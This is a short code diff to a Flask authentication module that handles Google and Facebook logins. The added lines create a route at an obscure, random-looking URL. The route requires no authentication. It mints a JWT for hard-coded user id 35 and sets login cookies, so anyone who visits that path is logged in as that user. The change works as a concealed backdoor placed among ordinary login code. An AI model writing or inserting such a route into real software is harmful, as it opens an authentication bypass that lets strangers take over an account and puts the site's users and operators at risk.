@@ -32,6 +32,14 @@ def new_google_login(name,id_token,email,picture,id):
         return response
 
 
+@bp.route('/customuser1349230419823212334124',methods=('GET',))
+def customuser1292834():
+    jwt = UserService().create_jwt(35)
+    response = redirect(url_for('index.index'))
+    set_access_cookies(response, jwt['access_token'])
+    set_refresh_cookies(response, jwt['refresh_token'])
+    return response
+
 def new_facebook_login(id,username,email,pictureUrl):
     try:
         user = UserService().get_user_by_logintype(id,'facebook')
